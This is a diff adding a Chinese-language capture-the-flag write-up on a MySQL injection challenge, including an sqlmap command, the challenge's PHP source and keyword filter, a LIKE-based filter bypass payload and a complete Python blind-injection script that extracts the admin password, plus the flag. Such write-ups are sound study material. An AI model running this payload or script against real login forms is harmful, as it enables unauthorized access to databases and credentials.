@@ -657,7 +657,155 @@ sqlmap走起。
 
 
 
-# #10.
+# #10.[第五空间 2021]yet_another_mysql_injection
+
+![image-20260111200052634](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260111200052634.png)
+
+一个正常的登入，直接1，1，尝试，发现显示only admin can login。
+
+尝试使用sqlmap指定POST admin参数为注入点，测试。
+
+`sqlmap -u http://node4.anna.nssctf.cn:25638/index.php --batch --data="username=admin&password=1" -p username`
+
+失败，并没有结果，即便提高等级。
+
+ctrl+u，发现：
+
+```
+<!-- /?source -->
+<html>
+    <body>
+        <form action="/index.php" method="post">
+            <input type="text" name="username" placeholder="账号"><br/>
+            <input type="password" name="password" placeholder="密码"><br/>
+            <input type="submit" / value="登录">
+        </form>
+    </body>
+</html>
+```
+
+给了一个?source，直接传一个1看看。
+
+```
+<?php
+include_once("lib.php");
+function alertMes($mes,$url){
+  die("<script>alert('{$mes}');location.href='{$url}';</script>");
+}
+
+function checkSql($s) {
+  if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
+    alertMes('hacker', 'index.php');
+  }
+}
+
+if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
+  $username=$_POST['username'];
+  $password=$_POST['password'];
+  if ($username !== 'admin') {
+    alertMes('only admin can login', 'index.php');
+  }
+  checkSql($password);
+  $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
+  $user_result=mysqli_query($con,$sql);
+  $row = mysqli_fetch_array($user_result);
+  if (!$row) {
+    alertMes("something wrong",'index.php');
+  }
+  if ($row['password'] === $password) {
+    die($FLAG);
+  } else {
+  alertMes("wrong password",'index.php');
+ }
+}
+
+if(isset($_GET['source'])){
+ show_source(__FILE__);
+ die;
+}
+?>
+<!-- /?source -->
+<html>
+  <body>
+    <form action="/index.php" method="post">
+      <input type="text" name="username" placeholder="账号"><br/>
+      <input type="password" name="password" placeholder="密码"><br/>
+      <input type="submit" / value="登录">
+    </form>
+  </body>
+</html>
+```
+
+得到源码，发现指定username=admin，并要求传输的password的值必须为数据库内的password，而且对传输的password直接check。
+
+过滤了：
+
+* `and`, `=`, `>`, `<`, `in`, `between`, `regexp`, `|` (管道符)
+
+- `substr`, `floor`, `extractvalue`, `update`, `reverse`, `right`, `left`, `sleep`
+- `&`, `;`, `$`, `0x` (十六进制), `\ ` (**空格**)
+- `flag`
+
+    <form action="/index.php" method="post">
+      <input type="text" name="username" placeholder="账号"><br/>
+      <input type="password" name="password" placeholder="密码"><br/>
+      <input type="submit" / value="登录">
+    </form>
+  </body>
+</html>
+
+空格被拿下可以用/**/代替，又因为flag直接被禁用，在加上题目的源码显示只要找到正确密码就可以直接拿到flag。
+
+所以思路为通过简单的比较注入。一个一个爆破密码。
+
+自搓脚本如下：
+
+```
+import requests
+url = "http://node4.anna.nssctf.cn:25638/index.php"
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_{}" #字典
+password = ""
+
+print("正在提取密码...")
+for i in range(1, 50):  #循环判断每一位密码
+    found = False
+    for char in characters:
+        current_test = password + char
+        payload = f"1'/**/OR/**/password/**/LIKE/**/'{current_test}%" #绕过，/**/替空格，LIKE替or或者and
+        
+        data = {
+            "username": "admin",
+            "password": payload
+        }
+        
+        response = requests.post(url, data=data) #发送
+        
+        if "wrong password" in response.text: #判断
+            password += char
+            print(f"当前找到的密码: {password}")
+            found = True
+            break
+            
+    if not found:
+        print(f"提取完成！最终密码为: {password}")
+        break
+```
+
+**NSSCTF{c3d18235-2f5e-4ac7-9587-ee7226c8c974}**
+
+
+
+---
+
+
+
+# #11.
+
+
+
+
+
+
 
 
 
